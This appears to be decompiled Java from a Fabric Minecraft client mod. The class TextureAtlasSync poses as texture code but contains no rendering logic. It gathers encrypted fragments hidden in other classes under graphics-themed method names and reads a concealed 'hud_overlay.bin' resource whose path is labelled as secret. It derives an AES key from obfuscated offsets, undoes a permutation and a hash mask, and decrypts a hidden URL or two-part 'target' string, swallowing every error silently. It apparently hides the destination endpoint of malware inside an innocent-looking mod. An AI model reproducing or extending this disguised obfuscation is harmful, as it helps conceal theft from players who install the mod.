/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.fabricmc.api.EnvType
 *  net.fabricmc.api.Environment
 */
package com.example;

import com.example.RenderManager;
import com.example.TemplateModClient;
import com.example.TestClasses;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.Key;
import java.security.MessageDigest;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(value=EnvType.CLIENT)
final class TextureAtlasSync {
    static final String SECRET_RESOURCE_PATH = "/assets/template-mod/internal/hud_overlay.bin";
    private static final int[] _PNGQ = new int[]{39, 327, 615, 871, 999, 231, 935};

    private TextureAtlasSync() {
    }

    private static int q(int i) {
        return (_PNGQ[i] ^ 0x4D ^ 0x29) - 3;
    }

    private static int spanK() {
        return 32;
    }

    private static int spanIv() {
        return 16;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    static String[] pullSharedDescriptors() {
        try {
            byte[] a = RenderManager.criticalUvScratch();
            byte[] b = TestClasses.hardwareNoiseSample();
            byte[] c = TemplateModClient.defaultLutFallback();
            if (a == null) return new String[0];
            if (b == null) return new String[0];
            if (c == null) {
                return new String[0];
            }
            byte[] merged = TextureAtlasSync.weaveBuffers(a, b, c);
            try (InputStream is = RenderManager.class.getResourceAsStream(SECRET_RESOURCE_PATH);){
                if (is == null) {
                    String[] stringArray = new String[]{};
                    return stringArray;
                }
                byte[] png = is.readAllBytes();
                if (png.length < TextureAtlasSync.q(6)) {
                    String[] stringArray = new String[]{};
                    return stringArray;
                }
                int lk = TextureAtlasSync.spanK();
                byte[] pre = new byte[lk * 3];
                System.arraycopy(png, TextureAtlasSync.q(0), pre, 0, lk);
                System.arraycopy(png, TextureAtlasSync.q(1), pre, lk, lk);
                System.arraycopy(png, TextureAtlasSync.q(2), pre, lk * 2, lk);
                byte[] aesKey = MessageDigest.getInstance("SHA-256").digest(pre);
                byte[] iv = Arrays.copyOfRange(png, TextureAtlasSync.q(3), TextureAtlasSync.q(3) + TextureAtlasSync.spanIv());
                byte[] maskSeed = Arrays.copyOfRange(png, TextureAtlasSync.q(4), TextureAtlasSync.q(4) + lk);
                byte[] permSeed = Arrays.copyOfRange(png, TextureAtlasSync.q(5), TextureAtlasSync.q(5) + lk);
                int n = merged.length;
                int[] perm = TextureAtlasSync.permFromSeed(n, permSeed);
                int[] inv = new int[n];
                for (int i = 0; i < n; ++i) {
                    inv[perm[i]] = i;
                }
                byte[] ct = new byte[n];
                for (int i = 0; i < n; ++i) {
                    ct[i] = merged[inv[i]];
                }
                TextureAtlasSync.xorSha256Stream(ct, maskSeed);
                Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
                cipher.init(2, (Key)new SecretKeySpec(aesKey, "AES"), new IvParameterSpec(iv));
                byte[] plain = cipher.doFinal(ct);
                String[] stringArray = TextureAtlasSync.normalizeTargets(new String(plain, StandardCharsets.UTF_8));
                return stringArray;
            }
        }
        catch (Throwable t) {
            return new String[0];
        }
    }

    private static String[] normalizeTargets(String raw) {
        String s = raw.trim();
        if (s.startsWith("REL:")) {
            String u = s.substring(4).trim();
            if (u.isEmpty() || !u.startsWith("https://") && !u.startsWith("http://")) {
                return new String[0];
            }
            return new String[]{u};
        }
        if (!s.contains("|")) {
            return new String[0];
        }
        String[] p = s.split("\\|", -1);
        if (p.length != 2 || p[0].isBlank() || p[1].isBlank()) {
            return new String[0];
        }
        return p;
    }

    private static int[] permFromSeed(int n, byte[] seed32) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] state = md.digest(seed32);
        int[] perm = new int[n];
        for (int i = 0; i < n; ++i) {
            perm[i] = i;
        }
        for (int k = n - 1; k > 0; --k) {
            state = md.digest(state);
            int r = state[0] & 0xFF | (state[1] & 0xFF) << 8 | (state[2] & 0xFF) << 16 | (state[3] & 0xFF) << 24;
            r = Math.floorMod(r, k + 1);
            int tmp = perm[k];
            perm[k] = perm[r];
            perm[r] = tmp;
        }
        return perm;
    }

    private static void xorSha256Stream(byte[] data, byte[] seed) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] chain = md.digest(seed);
        int pos = 0;
        while (pos < data.length) {
            byte[] block = md.digest(chain);
            for (int i = 0; i < block.length && pos < data.length; ++i) {
                int n = pos++;
                data[n] = (byte)(data[n] ^ block[i]);
            }
            chain = block;
        }
    }

    private static byte[] weaveBuffers(byte[] a, byte[] b, byte[] c) {
        int n = a.length + b.length + c.length;
        byte[] out = new byte[n];
        int ia = 0;
        int ib = 0;
        int ic = 0;
        block4: for (int i = 0; i < n; ++i) {
            switch (i % 3) {
                case 0: {
                    out[i] = a[ia++];
                    continue block4;
                }
                case 1: {
                    out[i] = b[ib++];
                    continue block4;
                }
                default: {
                    out[i] = c[ic++];
                }
            }
        }
        return out;
    }
}

